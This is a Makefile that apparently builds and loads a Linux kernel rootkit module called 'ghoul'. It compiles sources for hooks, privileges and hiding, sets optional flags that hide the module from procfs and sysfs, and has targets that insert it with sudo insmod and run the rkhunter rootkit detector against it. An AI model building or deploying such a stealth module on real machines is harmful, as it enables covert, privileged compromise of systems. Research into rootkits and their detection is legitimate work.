ifneq (,$(wildcard ./.env))
    include .env
    export
endif

ifdef GHOUL_MODULE_NAME
module_name = $(GHOUL_MODULE_NAME)
else
module_name = ghoul
endif
ccflags-y := -D MODULE_NAME='"$(module_name)"'
obj-m += $(module_name).o
$(module_name)-objs := ./src/$(module_name).o ./src/load.o ./src/hooks.o ./src/service.o ./src/privileges.o ./src/hide.o
KVERSION = $(shell uname -r)

# Compiler definitions from .env file
ifeq ($(STEALTH_HIDE_MODULE_PROCFS), y)
ccflags-y := $(ccflags-y) -D HIDE_MODULE_PROCFS
endif
ifeq ($(STEALTH_HIDE_MODULE_SYSFS), y)
ccflags-y := $(ccflags-y) -D HIDE_MODULE_SYSFS
endif

all:
ifneq ($(module_name), ghoul)
		$(shell cp src/ghoul.c src/$(module_name).c)
endif
		make -C /lib/modules/$(KVERSION)/build M=$(PWD) modules

run: all
		python3 ghoulctl.py unload
		sudo insmod $(module_name).ko

clean:
		python3 ghoulctl.py unload
		make -C /lib/modules/$(KVERSION)/build M=$(PWD) clean
ifneq ($(module_name), ghoul)
		rm -f src/$(module_name).c
endif
		rm -rf __pycache__
		rm -rf .pytest_cache
		rm -rf tests/__pycache__

test: all
		python3 ghoulctl.py unload
		sudo insmod $(module_name).ko
		python3 -m pip install --no-input -q pytest-ordering
		-python3 -m pytest -s
		python3 ghoulctl.py unload

rkhunter: all
		python3 ghoulctl.py unload
		sudo insmod $(module_name).ko
		-sudo rkhunter --check --sk
		python3 ghoulctl.py unload